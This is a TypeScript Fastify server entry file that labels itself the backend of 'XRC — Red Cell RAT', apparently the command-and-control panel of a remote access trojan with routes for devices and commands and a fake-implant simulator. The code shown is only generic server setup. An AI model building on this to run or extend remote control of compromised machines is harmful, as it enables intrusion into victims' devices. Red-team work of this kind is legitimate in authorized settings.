import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import Fastify, { type FastifyServerOptions } from 'fastify';
import fastifyCors from '@fastify/cors';
import fastifyStatic from '@fastify/static';
import { HOST, IS_PROD, PORT, TRUST_PROXY, authEnabled, PANEL_USER } from './config/env.js';
import { closeDb, initDb } from './db/index.js';
import { migrate } from './db/migrate.js';
import { registerAuthGuard } from './plugins/auth.js';
import { authRoutes } from './routes/auth.js';
import { commandsRoutes } from './routes/commands.js';
import { devicesRoutes } from './routes/devices.js';
import { logsRoutes } from './routes/logs.js';
import { statsRoutes } from './routes/stats.js';
import { socketService } from './services/socket.js';
import { log } from './utils/logger.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PANEL_DIST = path.resolve(__dirname, '../../panel/dist');

async function main(): Promise<void> {
  initDb();
  migrate();

  const app = Fastify({
    logger: false,
    trustProxy: TRUST_PROXY as FastifyServerOptions['trustProxy'],
  });

  app.setErrorHandler((error, request, reply) => {
    const statusCode = (error as { statusCode?: number }).statusCode || 500;
    const message = statusCode === 500 ? 'Internal server error' : (error as Error).message;
    log.error(`Error ${statusCode} on ${request.method} ${request.url}: ${(error as Error).message}`, (error as Error).stack ?? '');
    reply.code(statusCode).send({ success: false, error: message });
  });

  await app.register(fastifyCors, { origin: true });
  registerAuthGuard(app);

  app.get('/api/health', async () => ({
    status: 'ok',
    uptime: process.uptime(),
    auth: authEnabled,
    version: '1.0.0',
  }));

  await app.register(authRoutes, { prefix: '/api' });
  await app.register(devicesRoutes, { prefix: '/api' });
  await app.register(commandsRoutes, { prefix: '/api' });
  await app.register(statsRoutes, { prefix: '/api' });
  await app.register(logsRoutes, { prefix: '/api' });

  if (fs.existsSync(PANEL_DIST)) {
    await app.register(fastifyStatic, { root: PANEL_DIST, prefix: '/', wildcard: false });
    let cachedIndex: string | null = null;
    try {
      cachedIndex = fs.readFileSync(path.join(PANEL_DIST, 'index.html'), 'utf-8');
    } catch {
      log.warn('panel index.html not found');
    }
    app.setNotFoundHandler(async (request, reply) => {
      if (request.url.startsWith('/api') || request.url.startsWith('/socket.io')) {
        return reply.code(404).send({ success: false, error: 'Not found' });
      }
      if (cachedIndex) return reply.type('text/html').send(cachedIndex);
      return reply.code(404).send({ success: false, error: 'Not found' });
    });
  } else {
    log.warn(`panel dist not found at ${PANEL_DIST} — running API-only (build panel next)`);
  }

  await app.listen({ port: PORT, host: HOST });
  socketService.initialize(app.server);

  console.log('');
  console.log('  \x1b[35m\x1b[1mXRC\x1b[0m \x1b[2m— Red Cell RAT · v1.0.0\x1b[0m');
  console.log('  \x1b[2m───────────────────────────────\x1b[0m');
  console.log(`  \x1b[2mAPI:\x1b[0m     http://localhost:${PORT}/api/health`);
  if (fs.existsSync(PANEL_DIST)) console.log(`  \x1b[2mPanel:\x1b[0m   http://localhost:${PORT}`);
  console.log(`  \x1b[2mAuth:\x1b[0m    ${authEnabled ? `enabled (user: ${PANEL_USER})` : 'disabled — set PANEL_USER/PANEL_PASS to enable'}`);
  console.log(`  \x1b[2mDB:\x1b[0m      SQLite (WAL)`);
  if (!IS_PROD) console.log('  \x1b[33m\x1b[1mSim:\x1b[0m    npm run sim -w @xrc/server — spawns a live fake implant\x1b[0m');
  console.log('');

  const shutdown = async (): Promise<void> => {
    log.info('shutting down');
    try {
      socketService.shutdown();
      await app.close();
      closeDb();
    } finally {
      process.exit(0);
    }
  };
  let shuttingDown = false;
  const safeShutdown = async (): Promise<void> => {
    if (shuttingDown) return;
    shuttingDown = true;
    await shutdown();
  };
  process.on('SIGTERM', () => void safeShutdown());
  process.on('SIGINT', () => void safeShutdown());
  process.on('unhandledRejection', (reason) => {
    log.error(`Unhandled rejection: ${reason instanceof Error ? reason.message : String(reason)}`);
  });
  process.on('uncaughtException', (err) => {
    log.error(`Uncaught: ${err.message}`, err.stack ?? '');
    void safeShutdown();
  });
}

main().catch((err) => {
  console.error('Server start failed:', err);
  process.exit(1);
});
